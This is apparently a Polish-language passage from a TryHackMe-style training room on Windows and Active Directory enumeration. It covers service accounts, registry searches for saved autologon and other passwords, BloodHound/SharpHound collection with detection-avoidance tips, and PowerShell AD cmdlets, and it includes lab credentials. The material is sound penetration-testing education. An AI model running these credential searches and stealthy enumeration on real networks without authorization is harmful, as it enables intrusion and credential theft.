Zauważenie konta z uprawnieniami administratora zalogowanego na komputerze to nie lada wyczyn. Ogólnie rzecz biorąc, istnieje duże prawdopodobieństwo, że znajdziemy jego dane uwierzytelniające lub tokeny w pamięci. W związku z tym atakujący próbowałby zrzucić dane z LSASS, aby na przykład uzyskać skrót hasła lub bilet Kerberos. Co więcej, atakujący może podszyć się pod token sesji, pod warunkiem że jego konto ma SeImpersonatePrivilege. Krótko mówiąc, zalogowany administrator to sygnał, że próba kradzieży tokena lub uruchomienia Mimikatz może prowadzić do dużej nagrody.

Istnieją inne przydatne polecenia, które pozwalają zbierać informacje o aktywności systemu i jego użytkownikach. Należy pamiętać, że uruchomienie poniższych dwóch przykładowych poleceń wymaga podwyższonych uprawnień:

tasklistWyświetla listę aktualnie uruchomionych procesów. Można użyć tasklist /V, aby uzyskać szczegółowe informacje o zadaniach.
net sessionWyświetla listę sesji SMB między komputerem a innymi komputerami w sieci. Do uruchomienia wymagane są uprawnienia administratora.

Wiersz poleceń
administrator@WRK C:\> tasklist

Image Name                     PID Session Name        Session#    Mem Usage 
========================= ======== ================ =========== ============
System Idle Process              0 Services                   0          8 K
System                           4 Services                   0        160 K
Registry                        84 Services                   0     69,576 K
smss.exe                       272 Services                   0      1,200 K
csrss.exe                      372 Services                   0      5,144 K
wininit.exe                    448 Services                   0      6,740 K
csrss.exe                      456 Console                    1      4,668 K
winlogon.exe                   508 Console                    1     10,008 K
services.exe                   584 Services                   0      9,520 K
lsass.exe                      600 Services                   0     17,924 K
Teraz, gdy wiemy, kto jeszcze korzysta z systemu, możemy znaleźć użytkowników, którzy zalogowali się do systemu co najmniej raz, sprawdzając katalog C:\Users\pod kątem folderów poszczególnych użytkowników. Dla każdego użytkownika, który zalogował się co najmniej raz, utworzony jest katalog domowy.

Identyfikacja kont usługowych
Nie wszystkie konta są przeznaczone dla użytkowników; wiele z nich to konta usługowe. Konta usługowe to konta lokalne i domenowe używane przez aplikacje i usługi. Zazwyczaj mają uprawnienia wystarczające do wykonania zadania; jednak w wielu przypadkach mogą to być nadal wysokie uprawnienia. Jak można się spodziewać, konta usługowe zazwyczaj mają statyczne hasła, które prawdopodobnie nie wygasną. Jeśli konto usługi aplikacji zapasowej ma wygasłe hasło, kopia zapasowa przestanie działać; nikt tego nie chce.

Szukaj za pomocą WMIC
Za pomocą WMIC możemy zbierać informacje o usługach systemu Windows, w tym o kontach dla każdej usługi. Po uruchomieniu programu WMIC wmic service getuzyskamy mnóstwo informacji o każdej usłudze; informacje o każdej usłudze są wyświetlane w jednym, bardzo długim wierszu. Możesz wyświetlić konkretne wiersze, takie jak nazwa usługi i powiązane konto, korzystając wmic service get Name,StartNamez poniższego schematu. Pamiętaj, że do uruchomienia programu potrzebne są uprawnienia administratora.

Wiersz poleceń
administrator@WRK C:\>  wmic service get Name,StartName
Name                                      StartName
AJRouter                                  NT AUTHORITY\LocalService     
ALG                                       NT AUTHORITY\LocalService     
AmazonSSMAgent                            LocalSystem
AppIDSvc                                  NT Authority\LocalService     
Appinfo                                   LocalSystem
AppMgmt                                   LocalSystem
AppReadiness                              LocalSystem
AppVClient                                LocalSystem
AppXSvc                                   LocalSystem
[...]
To StartNamekonto, na którym działa usługa. Standardowe konta to: LocalSystem, NT AUTHORITY\LocalService, NT AUTHORITY\NetworkServicei NT SERVICE\SomeServiceNamedla kont usług wirtualnych. Czasami można znaleźć usługę z kontem domenowym DomainName\username. Warto sprawdzić takie konta domenowe, ponieważ mogą być ponownie wykorzystywane gdzie indziej lub ich hasło może nie być zgodne z oczekiwaną złożonością.

Jeśli używasz programu PowerShell, odpowiednikiem tego wmic service get Name,StartNamepolecenia jest Get-WmiObject Win32_Service | select Name, StartName. Wynik powinien być podobny do powyższego. Podobnie, wymaga to uprawnień administratora.

Windows PowerShell
PS C:\> Get-WmiObject Win32_Service | select Name, StartName 

Name                                     StartName
----                                     ---------
AJRouter                                 NT AUTHORITY\LocalService   
ALG                                      NT AUTHORITY\LocalService   
AmazonSSMAgent                           LocalSystem
AppIDSvc                                 NT Authority\LocalService   
Appinfo                                  LocalSystem
AppMgmt                                  LocalSystem
AppReadiness                             LocalSystem
AppVClient                               LocalSystem
[...]
Przejrzenie listy może ujawnić kilka ciekawych historii, których możesz nie znać.

Szukaj za pomocą SC
Oprócz tego wmicmożemy wyliczyć usługi na komputerze lokalnym za pomocą scpolecenia . SC to program wiersza poleceń, który komunikuje się z usługami i Menedżerem sterowania usługami.

sc query state= allzwróci wszystkie usługi w systemie Windows; jednak do uruchomienia wymagane są uprawnienia administratora.

Wiersz poleceń
administrator@WRK C:\> sc query state= all

SERVICE_NAME: AJRouter
DISPLAY_NAME: AllJoyn Router Service
        TYPE               : 20  WIN32_SHARE_PROCESS
        STATE              : 1  STOPPED
        WIN32_EXIT_CODE    : 1077  (0x435)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

SERVICE_NAME: ALG
DISPLAY_NAME: Application Layer Gateway Service
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 1  STOPPED
        WIN32_EXIT_CODE    : 1077  (0x435)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
[...]
Alternatywnie, ponieważ zwróci bardzo długą listę, możesz odfiltrować wynik, na przykład sc query state= all | find "Keyword". Po uzyskaniu nazwy usługi możesz użyć , sc qc <ServiceName>aby ją znaleźć. Pamiętaj, że nazwa usługi jest potrzebna do sc qcdziałania.

Wiersz poleceń
C:\>sc query state= all | find "DHCP"
SERVICE_NAME: DHCP

C:\>sc qc DHCP
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: DHCP
        TYPE               : 20  WIN32_SHARE_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\system32\svchost.exe -k LocalServiceNetworkRestricted -p
        LOAD_ORDER_GROUP   : TDI
        TAG                : 0
        DISPLAY_NAME       : DHCP Client
        DEPENDENCIES       : NSI
                           : Afd
        SERVICE_START_NAME : NT Authority\LocalService
Jak widać, ujawnia SERVICE_START_NAMEnazwę konta usługi, za pomocą którego uruchomiono DHCPusługę.

Obserwacja środowiska i rejestru
Ostatni punkt tego zadania dotyczy trwałej konfiguracji systemu, w szczególności zmiennych środowiskowych i rejestru systemu Windows.

Omówiliśmy już zakres informacji dostępnych za pośrednictwem setpolecenia. Z perspektywy atakującego zmienne środowiskowe, takie jak JAVA_HOME, ujawniają wskazówki dotyczące zainstalowanego oprogramowania, aplikacji i narzędzi programistycznych.

Rejestr systemu Windows może przechowywać niezliczoną ilość informacji o aktywności systemu. Jednak przeglądanie wszystkich jego kluczy i wartości jest bardzo obszerne i nierealne. Wspomnimy o kilku kwestiach, które warto sprawdzić.

Zapisane dane logowania automatycznego
Po uruchomieniu serwery i systemy są blokowane do momentu ręcznego wprowadzenia danych logowania przez użytkownika. W przypadku systemu błędnie skonfigurowanego lub testowego, dane logowania do automatycznego logowania mogą zostać zapisane. W takim przypadku można je znaleźć w sekcji HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon. Warto sprawdzić DefaultPassword, czy zostały zapisane i AutoAdminLogonczy są ustawione na 1. Możesz wyszukać żądaną wartość, korzystając z reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v keywordnastępującego polecenia:

Wiersz poleceń
C:\> reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUsername

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
    DefaultUsername    REG_SZ    Strategos
Jeśli hasło zostanie zapisane, będzie podane w postaci zwykłego tekstu.

Inną ciekawą lokalizacją w rejestrze jest HKLM\Security\Cache; jednak w tym przypadku wymagane są uprawnienia administratora; ponadto dane uwierzytelniające zostaną zaszyfrowane i będą wymagały złamania.

Zainstalowane aplikacje
Możesz uruchomić program reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall, aby szybko uzyskać listę zainstalowanych aplikacji. Lista ta może być przydatna, zwłaszcza jeśli znajdziesz serwer ze znanymi domyślnymi danymi logowania. W tym podejściu zakładamy, że masz dostęp do wiersza poleceń i nie masz dostępu do Panelu sterowania.

Wiersz poleceń
tryhackme\asrepuser1@WRK C:\> reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\AddressBook
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\Connection Manager
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\DirectDrawEx
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\DXM_Runtime
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\Fontcore
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\IE40
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\IE4Data
Przeszukiwanie rejestru
W rejestrze możesz znaleźć wiele innych rzeczy. Sekcję rejestru kończymy następującym poleceniem, aby przeszukać rejestr pod kątem określonego słowa kluczowego. Na przykład, aby przeszukać rejestr pod kątem password, możesz użyć:

reg query HKLM /f "password" /t REG_SZ /s

Zaplanowane zadania
Kolejną rzeczą, którą należy rozważyć przed zakończeniem tej części, są zaplanowane zadania. Możesz wyświetlić wszystkie zaplanowane zadania za pomocą schtasks /query. Dodatkowo, możesz użyć schtasks, aby utworzyć nowe zaplanowane zadanie za pomocą , /createlub uruchomić istniejące zaplanowane zadanie za pomocą /run.

Użyj klienta SSH, aby połączyć się ze stacją roboczą za pomocą adresu IP 10.211.12.20. Użyj następujących danych logowania do konta domenowego:

Nazwa użytkownika:asrepuser1
Hasło:qwerty123!

URUCHAMIA RDP : xfreerdp /v:10.211.12.20 /u:rduke /p:Password1\! /dynamic-resolution

BloodHound

BloodHound pozostaje najskuteczniejszym narzędziem dla usługi Active Directory (OGŁOSZENIE) wyliczenie, które zrewolucjonizowało tę dziedzinę od czasu jego wydania w 2016 r. Początkowo opracowane przez SpecterOps, wprowadziło perspektywę opartą na grafach do zabezpieczeń AD — fundamentalną zmianę, która od tego czasu została przyjęta zarówno przez atakujących, jak i obrońców.

### Krótka historia

Przez lata członkowie red teamów – i, niestety, atakujący – mieli przewagę w postaci wglądu w złożone relacje w usłudze Active Directory. Wprowadzenie BloodHounda zmieniło wszystko, umożliwiając specjalistom ds. bezpieczeństwa mapowanie uprawnień, członkostwa w grupach i relacji zaufania na **grafie** , zamiast polegać na izolowanych **listach** .

Zmianę tę najlepiej oddaje znane obecnie powiedzenie:

> **„Obrońcy myślą listami. Atakujący myślą wykresami.” — John Lambert.**

Tradycyjnie obrońcy pracowali ze statycznymi listami, takimi jak lista administratorów domeny lub serwerów. Natomiast atakujący wykorzystywali ukryte relacje między użytkownikami, grupami i komputerami – relacje, które ujawniały się dopiero dzięki analizie grafów.

Firma Microsoft doceniła skuteczność tego narzędzia i ostatecznie zintegrowała podobne, oparte na grafach, metody w rozwiązaniu Defender for Identity.

### Model ataku dwuetapowego

BloodHound umożliwił nowe, dwuetapowe podejście do ataków na środowiska Active Directory:

**Etap 1: Wyliczenie**

Atakujący wdrażają moduły zbierające dane (takie jak SharpHound lub BloodHound-python), aby gromadzić informacje o strukturze usługi Active Directory, w tym o sesjach użytkowników, członkostwie w grupach, listach kontroli dostępu (ACL) i ustawieniach delegowania. Nawet jeśli zostanie to wykryte wcześnie przezniebieski zespół, atakujący posiadają teraz wystarczającą ilość danych offline, aby stworzyć kompletny wykres ataku.

**Etap 2: Atak ukierunkowany**

Korzystając z BloodHound w trybie offline, atakujący identyfikują precyzyjne i efektywne ścieżki do swoich celów (np. uzyskania uprawnień administratora domeny). Po ponownym wejściu do środowiska mogą poruszać się poziomo i eskalować uprawnienia **w ciągu kilku minut** , często szybciej, niż zespół ds. bezpieczeństwa zdąży zareagować na pierwszy alert.

Możliwość **planowania ataków offline na podstawie szczegółowego mapowania relacji** uczyniła z BloodHound niezastąpione narzędzie do ofensywy i proaktywnej obrony.

### Ewolucja i współczesne możliwości

- **Obsługa platformy Azure** : BloodHound obejmuje teraz **usługę AzureHound** , która umożliwia wyliczanie środowisk Azure Entra ID i tradycyjnych lokalnych usług AD.
- **Nowe prymitywy ataków** : Aktualizacje dodały wykrywanie ścieżek ataku obejmujących techniki takie jak **Resource-Based Constrained Delegation (RBCD)** poprzez prymitywy takie jak `AddAllowedToAct`i `AllowedToAct`.
- **Zaawansowane algorytmy analizy** : Techniki takie jak algorytm Butterfly umożliwiają lepszą ocenę ryzyka i jego priorytetyzację, dzięki czemu użytkownicy mogą lepiej zrozumieć wpływ relacji i podatności.

Dzięki tym usprawnieniom BloodHound może obsługiwać nawet większe środowiska hybrydowe (w chmurze/lokalnie) z dużo większą wydajnością i głębią.

### Perspektywa obrońcy

Obecnie obrońcy wykorzystują BloodHound (i BloodHound Enterprise) do proaktywnego identyfikowania błędnych konfiguracji, nadmiernych uprawnień i ryzykownych ścieżek dostępu, **zanim** atakujący będą mogli je wykorzystać.

Dzięki ciągłemu mapowaniu i monitorowaniu relacji AD obrońcy mogą zwiększać odporność swojego otoczenia na standardowe i zaawansowane techniki ataków, co sprawia, że ​​BloodHound staje się narzędziem zarówno do ataku, jak i obrony.

## Zbieranie danych

Użytkownicy często używają zamiennie określeń SharpHound i BloodHound-python. Należy jednak pamiętać, że nie są to te same narzędzia. SharpHound to komponent BloodHound odpowiedzialny za gromadzenie danych. Gromadzi on informacje z Active Directory (AD), które BloodHound następnie wizualizuje na wykresach ataków. Dlatego zrozumienie możliwości SharpHound jest kluczowe przed analizą wykresów w BloodHound.

### Zrozumienie SharpHound

**SharpHound** to oficjalny moduł zbierający dane BloodHound, napisany w języku C#. Wylicza kluczowe elementy usługi Active Directory, takie jak:

- Członkostwo w grupach
- Dane sesji
- Listy kontroli dostępu (ACL)
- Zaufanie domenowe
- Uprzywilejowane relacje (np. uprawnienia administratora lokalnego)

### Rodzaje kolekcjonerów SharpHound

- **`SharpHound.exe`**: Jest to plik wykonywalny systemu Windows przeznaczony do standardowej enumeracji na komputerach z systemem Windows przyłączonych do domeny. Ze względu na swoją wszechstronność i solidną funkcjonalność jest to obecnie zalecana metoda.
- **`AzureHound.ps1`**:Skrypt programu PowerShell skoncentrowany na środowiskach Azure Entra ID. Umożliwia płynne wyliczanie konfiguracji i tożsamości specyficznych dla chmury w hybrydowych scenariuszach usługi AD.
- **`SharpHound.ps1`(Przestarzałe)** : WcześniejPowerShellWariant używany do operacji ukrytych, jest szczególnie przydatny do ładowania skryptów bezpośrednio do pamięci, aby uniknąć wykrycia przez program antywirusowy. Jednak w ostatnich wersjach zaprzestano obsługi, faworyzując podejścia wykonywalne i oparte na Pythonie.

### BloodHound.py (kolekcjoner Pythona)

Oprócz **SharpHound** istnieje również oparty na Pythonie kolektor znany jako **`BloodHound.py`**. Idealny dla systemów Linux lub środowisk, w których preferowany jest Python, **`BloodHound.py`**umożliwia enumerację domen AD bez konieczności stosowania narzędzi specyficznych dla systemu Windows. Obsługuje uwierzytelnianie za pomocą poświadczeń, skrótów NTLM lub biletów Kerberos i generuje pliki JSON lub skompresowane pliki ZIP, kompatybilne z graficznym interfejsem użytkownika **BloodHound .**

**Uwaga:** Aby uzyskać najlepsze wyniki, wersje BloodHound i SharpHound muszą być zgodne. Aktualizacje BloodHound zazwyczaj uniemożliwiają pobieranie starszych wyników SharpHound. Ponadto, chociaż BloodHound.py jest powszechnie używany do…Linux-, zespół programistów BloodHound oficjalnie go nie wspiera.

### Wykonywanie SharpHound

Podczas przeprowadzania oceny w systemie Windows możemy uruchomić SharpHound na komputerze z systemem Windows przyłączonym do domeny. Należy jednak pamiętać, że plik binarny może zostać zablokowany przez program Windows Defender. Można go uruchomić z poziomu wiersza poleceń systemu Windows, jak pokazano poniżej.

Wiersz poleceń

```shell-session
C:\> .\SharpHound.exe --CollectionMethods All --Domain tryhackme.loc --ExcludeDCs
```

**Wyjaśnienie parametrów:**

- **`--CollectionMethods All`**:Określa, że ​​należy stosować wszystkie metody gromadzenia danych
- **`--Domain tryhackme.loc`**: Celuje w określoną domenę w celu zbierania danych
- **`--ExcludeDCs`**:Wyklucza kontrolery domeny z procesu gromadzenia danych w celu zmniejszenia ryzyka wykrycia

## Korzystanie z BloodHound.py

Możesz użyć systemu Linux, jeśli nie masz dostępu do komputera z systemem Windows podłączonego do domeny. W tym przypadku uruchomimy polecenie `bloodhound-python`. Poniżej w terminalu pokazano polecenie:

Terminal AttackBox

```shell-session
root@attackbox:~# bloodhound-python -u asrepuser1 -p qwerty123! -d tryhackme.loc -ns 10.211.12.10 -c All --zip
INFO: Found AD domain: tryhackme.loc
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (tryhackme.loc:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: dc.tryhackme.loc
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: dc.tryhackme.loc
INFO: Found 32 users
INFO: Found 58 groups
INFO: Found 5 gpos
INFO: Found 15 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: WRK.tryhackme.loc
INFO: Querying computer: DC.tryhackme.loc
INFO: Done in 00M 02S
INFO: Compressing output into 20250519140049_bloodhound.zip
```

**Wyjaśnienie parametrów:**

- **`-u username`**:Określa nazwę użytkownika do uwierzytelniania
- **`-p password`**:Określa hasło do uwierzytelniania
- **`-d tryhackme.loc`**: Celuje w określoną domenę w celu zbierania danych
- **`-ns`**:Określa adres IP serwera DNS
- **`-c All`**:Wykorzystuje wszystkie dostępne metody zbierania danych
- **`--zip`**: Kompresuje dane wyjściowe do archiwum ZIP, co ułatwia import do BloodHound

Zwróć uwagę, że ostatni wiersz zawiera nazwę skompresowanego pliku zawierającego nasze dane wyjściowe. W następnym kroku zalogujemy się do BloodHound-CE, aby zaimportować i przetworzyć ten `zip`plik.

### Zagadnienia bezpieczeństwa operacyjnego

Podczas przeprowadzania ocen należy pamiętać, że narzędzia do gromadzenia danych, takie jak **SharpHound** i **BloodHound.py,** mogą generować alerty bezpieczeństwa. Aby zminimalizować ryzyko wykrycia:

- Użyj tej **`--ExcludeDCs`**flagi, aby uniknąć wysyłania zapytań do kontrolerów domeny
- Zastosuj bardziej dyskretne metody gromadzenia danych, takie jak **`DCOnly`**, aby ograniczyć interakcje z wrażliwymi systemami
- Uruchom kolektory z systemów z odpowiednimi wykluczeniami oprogramowania antywirusowego lub maszyn niepołączonych z domeną, używając polecenia `runas`z `/netonly`flagą uwierzytelniania bez dołączania do domeny

Przed podjęciem takich działań należy zawsze upewnić się, czy posiadają Państwo odpowiednie zezwolenie.

## Dostęp do BloodHound-CE

BloodHound-CE działa teraz jako aplikacja internetowa, zazwyczaj hostowana na innej maszynie. Aby uzyskać do niej dostęp:

1. Otwórz przeglądarkę na swoim urządzeniu AttackBox lub komputerze hosta
2. Przejdź do adresu IP i portu serwera BloodHound-CE (to już skonfigurowaliśmy `http://10.211.12.100:8080`).
3. Zaloguj się, używając następujących danych:

- Nazwa użytkownika:`admin`
- Hasło:`weU^BjZr33OIWsC^`

![Ekran logowania BloodHound Community Edition](https://cdn-images.tryhackme.com/user-uploads/6808d44047ac5684351c94da/room-content/6808d44047ac5684351c94da-1747251188407.png)

## Importowanie danych kolekcji

Po zalogowaniu się i upewnieniu się, że wygenerowałeś plik ZIP gotowy do wczytania (na przykład uruchamiając SharpHound lub bloodhound-python z `--zip`flagą), wykonaj następujące kroki:

1. Przejdź do zakładki **Administracja** w menu nawigacyjnym po lewej stronie
2. Przewiń do sekcji **Pobieranie plików**
3. Prześlij plik ZIP bezpośrednio przez przeglądarkę

![Sekcja pobierania plików](https://cdn-images.tryhackme.com/user-uploads/6808d44047ac5684351c94da/room-content/6808d44047ac5684351c94da-1747281716440.png)

## Eksploracja danych BloodHound

Kliknij kartę **Eksploruj** , aby wyświetlić wizualny wykres usługi Active Directory.

- **Węzły** : reprezentują użytkowników, komputery, grupy itp.
- **Krawędzie** : reprezentują relacje i uprawnienia między węzłami.

![Węzły i krawędzie](https://cdn-images.tryhackme.com/user-uploads/6808d44047ac5684351c94da/room-content/6808d44047ac5684351c94da-1747504454168.png)

## Wyszukiwanie węzłów

1. Aby znaleźć konto użytkownika ASREPUSER1, skorzystaj z paska wyszukiwania u góry
2. Kliknij węzeł, aby wyświetlić jego właściwości

![Węzły, w które możesz kliknąć, aby wyświetlić jego właściwości](https://cdn-images.tryhackme.com/user-uploads/6808d44047ac5684351c94da/room-content/6808d44047ac5684351c94da-1747504454345.png)

## Podział informacji o węźle

- **Informacje o obiekcie** – podsumowanie szczegółów obiektu, takich jak nazwa, typ i domena
- **Sesje** – aktywne sesje logowania powiązane z obiektem
- **Członek** – grupy AD, do których należy obiekt
- **Uprawnienia administratora lokalnego** – maszyny, na których obiekt ma uprawnienia administratora lokalnego
- **Uprawnienia do wykonywania** – prawa takie jak RDP lub równoważne uprawnienia
- **Kontrola obiektów wychodzących** – prawa, jakie obiekt ma nad innymi obiektami
- **Kontrola obiektów przychodzących** – prawa, jakie inne obiekty mają do tego obiektu

Kliknij numer znajdujący się obok sekcji, aby ją rozwinąć.

## Korzystanie z wbudowanych zapytań

Aby skorzystać z wbudowanych zapytań BloodHound:

1. Kliknij **Cypher** w górnym menu
2. Kliknij **ikonę folderu** , aby przeglądać wstępnie utworzone zapytania (np. „Wszyscy administratorzy domeny”)

![Wbudowane zapytania](https://cdn-images.tryhackme.com/user-uploads/6808d44047ac5684351c94da/room-content/6808d44047ac5684351c94da-1747284461029.png)

Wbudowane zapytania

## Odkrywanie ścieżki ataku

1. Kliknij przycisk **Pathfinding** na pasku górnym
2. Ustaw `EMPANADAL0V3R`jako **węzeł początkowy**
3. Ustaw cel (np. `Tier 1 ADMINS`) jako **węzeł końcowy**
4. Uruchom wyszukiwanie z wybranymi filtrami krawędzi

Jeśli ścieżka istnieje, BloodHound zmapuje ją wizualnie. Jeśli nie, może to wynikać z braku lub niekompletności danych.

## Korzyści i ograniczenia

Zaletami BloodHound-CE są interfejs sieciowy, przejrzyste wizualizacje ścieżek ataków i dogłębny wgląd w relacje w usłudze Active Directory. Należy jednak pamiętać, że kolekcja SharpHound jest zaszumiona i może powodować…AV/EDRalerty.

Krótko mówiąc, BloodHound-CE to niezbędne narzędzie dla testerów penetracyjnych. Wizualizuje relacje w Active Directory i pomaga odkryć ścieżki eskalacji uprawnień. Zapoznaj się z nim osobiście.

W zadaniu 3 w dużym stopniu polegaliśmy na wierszu poleceń. Chociaż wiersz poleceń jest dość przydatny, możemy pracować wydajniej, mając dostęp do systemu Windows.PowerShellTo zadanie jest podzielone na dwie części. W pierwszej części zapoznamy się z `ActiveDirectory`modułem oficjalnym, a w drugiej z `PowerView`modułem z frameworka PowerSploit.

## Wyliczanie za pomocą modułu ActiveDirectory

Moduł `ActiveDirectory`jest dostępny na kontrolerach domeny. W przypadku innych stacji roboczych i serwerów należy pobrać narzędzia administracji zdalnej serwera (RSAT) dla systemu Windows. Alternatywnie, niektóre repozytoria udostępniają moduł ActiveDirectory, co ułatwia instalację bez konieczności instalowania całego RSAT.

Aby to zrobić, użyj terminala w AttackBoxie, aby `ssh`połączyć się ze stacją roboczą za pomocą adresu IP `10.211.12.20`. Użyjemy następujących danych logowania:

- Nazwa użytkownika:`asrepuser1`
- Hasło:`qwerty123!`

Nawiązywanie połączenia przez SSH pokazano w terminalu poniżej.

Terminal AttackBox

```shell-session
user@tryhackme:~# ssh asrepuser1@10.211.12.20
asrepuser1@10.211.12.20's password: 

Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

tryhackme\asrepuser1@WRK C:\Users\asrepuser1>
```

Następnie musimy uruchomić program Windows PowerShell, wykonując polecenie `powershell`. Zwróć uwagę, że wiersz poleceń programu PowerShell rozpoczyna się od `PS`. Zmiana z wiersza poleceń na program Windows PowerShell jest pokazana w terminalu poniżej.

Wiersz poleceń

```shell-session
C:\Users\asrepuser1>powershell
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\asrepuser1>
```

Aby rozpocząć, sprawdź, czy moduł jest dostępny; możesz to sprawdzić, uruchamiając go `Get-Module -ListAvailable ActiveDirectory`w programie PowerShell. Jeśli moduł jest dostępny, możesz go łatwo zaimportować za pomocą polecenia `Import-Module ActiveDirectory`. Jest to pokazane w terminalu poniżej.

Windows PowerShell

```shell-session
PS C:\Users\asrepuser1> Import-Module ActiveDirectory
PS C:\Users\asrepuser1> 
```

### Wyliczanie użytkowników

Możesz uzyskać dostęp do wszystkich użytkowników, uruchamiając `Get-ADUser -Filter *`program PowerShell i obserwując na ekranie zrzut wszystkich kont.

Windows PowerShell

```shell-session
PS C:\Users\asrepuser1> Get-ADUser -Filter * 

DistinguishedName : CN=Administrator,CN=Users,DC=tryhackme,DC=loc 
Enabled           : True
GivenName         : 
Name              : Administrator
ObjectClass       : user
ObjectGUID        : dafecc0e-a826-483b-a12d-b253596507af
SamAccountName    : Administrator
SID               : S-1-5-21-1966530601-3185510712-10604624-500   
Surname           : 
UserPrincipalName : 
[...]
```

Możesz uzyskać szczegółowe informacje o dowolnym użytkowniku, uruchamiając `Get-ADUser -Identity <username>`; jeśli chcesz wyświetlić listę wszystkich właściwości tego użytkownika, możesz rozszerzyć polecenie, aby `Get-ADUser -Identity <username> -Properties *`uzyskać strony z informacjami o danym koncie.

Aby uzyskać bardziej zwięzłe informacje, możesz wybrać właściwości, które Cię najbardziej interesują. Na przykład, `LastLogonDate`informuje, czy konto jest nieaktywne, `MemberOf`ujawnia przynależne do niego grupy, `Description`może zawierać interesujące informacje, a także `Title`ujawnia stanowisko.

Windows PowerShell

```shell-session
PS C:\> Get-ADUser -Identity Administrator -Properties LastLogonDate,MemberOf,Title,Description,PwdLastSet

Description       : Built-in account for administering the computer/domain
DistinguishedName : CN=Administrator,CN=Users,DC=tryhackme,DC=loc
Enabled           : True
GivenName         :
LastLogonDate     : 14/05/2025 15:36:39
MemberOf          : {CN=Group Policy Creator Owners,CN=Users,DC=tryhackme,DC=loc, CN=Domain Admins,CN=Users,DC=tryhackme,DC=loc, CN=Enterprise
                    Admins,CN=Users,DC=tryhackme,DC=loc, CN=Schema Admins,CN=Users,DC=tryhackme,DC=loc...}
Name              : Administrator
ObjectClass       : user
ObjectGUID        : dafecc0e-a826-483b-a12d-b253596507af
PwdLastSet        : 133905008516238984
SamAccountName    : Administrator
SID               : S-1-5-21-1966530601-3185510712-10604624-500
Surname           :
Title             :
UserPrincipalName :
```

Co więcej, możesz filtrować wyniki według określonych kryteriów. Na przykład, aby znaleźć konta, które zawierają `admin`te kryteria, możesz wystawić `Get-ADUser -Filter "Name -like '*admin*'"`.

### Wyliczenie grup

Możesz pobrać wszystkie grupy, uruchamiając polecenie `Get-ADGroup -Filter *`, które zwróci wszystkie grupy utworzone w domenie Active Directory. Alternatywnie możesz użyć `Get-ADGroup -Filter * | Select Name`polecenia , aby wyświetlić tylko określone pola programu PowerShell, takie jak nazwa grupy.

Windows PowerShell

```shell-session
PS C:\> Get-ADGroup -Filter * | Select Name

Name
----
Administrators
Users
Guests
Print Operators
Backup Operators
Replicator
Remote Desktop Users
Network Configuration Operators
[...]
```

Możesz wyświetlić wszystkich członków grupy za pomocą `Get-ADGroupMember -Identity "Group Name"`. Na przykład, `Get-ADGroupMember -Identity "Remote Management Users"`pokaże Ci konta należące do grupy użytkowników zdalnego zarządzania, a także `Get-ADGroupMember -Identity "Domain Admins"`konta z uprawnieniami administratorów domeny.

### Wyliczanie komputerowe

Wyliczanie komputerów jest również podobne i zapewne już się domyśliłeś. `Get-ADComputer -Filter *`Wyświetli wszystkie konta komputerów; ponadto możesz określić pola, które chcesz wyświetlić, przesyłając dane wyjściowe przez `Select`. Na przykład, `Get-ADComputer -Filter * | Select Name, OperatingSystem`wyświetli tylko nazwę komputera i system operacyjny.

### Inne przykłady

Moduł ActiveDirectory PowerShell oferuje wiele innych poleceń. Na przykład, `Get-ADDefaultDomainPasswordPolicy`ujawnia politykę haseł obowiązującą w domenie. Poniższy przykład przedstawia wynik terminala.

Windows PowerShell

```shell-session
PS C:\> Get-ADDefaultDomainPasswordPolicy

ComplexityEnabled           : True
DistinguishedName           : DC=tryhackme,DC=loc
LockoutDuration             : 00:30:00
LockoutObservationWindow    : 00:30:00
LockoutThreshold            : 0
MaxPasswordAge              : 42.00:00:00
MinPasswordAge              : 1.00:00:00
MinPasswordLength           : 7
objectClass                 : {domainDNS}
objectGuid                  : 4bd7e370-1577-4ab2-894c-ea0781ea33f9
PasswordHistoryCount        : 24
ReversibleEncryptionEnabled : False
```

Różne dostępne polecenia można sprawdzić w oficjalnej [dokumentacji modułu ActiveDirectory PowerShell(otwiera się w nowej karcie)](https://learn.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2025-ps).

## Wyliczanie za pomocą PowerView

### Czym jest PowerView?

